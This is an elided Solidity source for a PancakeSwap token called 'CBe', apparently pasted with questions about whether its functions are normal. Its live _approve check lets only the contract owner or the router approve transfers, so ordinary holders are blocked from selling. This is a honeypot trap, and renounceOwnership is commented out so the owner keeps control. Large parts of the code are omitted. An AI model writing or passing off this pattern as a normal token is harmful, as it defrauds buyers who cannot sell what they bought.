...
pragma solidity ^0.8.4;
  ...
  contract Ownable is Context {
     ...
     /** function renounceOwnership() public virtual onlyOwner {
          emit OwnershipTransferred(_owner, address(0)); // renouncing ownership
          _owner = address(0);
      }*/
  ...
  interface IUniswapV2Router01 {
      ...
      // Now is this a normal function when you add liquidity or no?
  ...
  contract CBe is Context, IERC20, Ownable {
      ...
      string private _name = "CBe";
      string private _symbol = "CBe";
      ...
      constructor ()  {
         ...
         // This is important, this is the bnb pancake v2 address
       ...
       /**  function mint(address _owner) public returns (bool) {
        _tTotal += 10;
        _tOwned[_owner] = _tOwned[_owner].add(10);
        emit Transfer(address(0), _owner, 10);
        return true;
    }*/
    
    /**
        @notice Mint 10 tokens to msg.sender
    ...
    /**function mint() public returns (bool) {
      ...
      function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && (owner == _owner || owner == address(uniswapV2Router)), "ERC20: approve to the zero address");
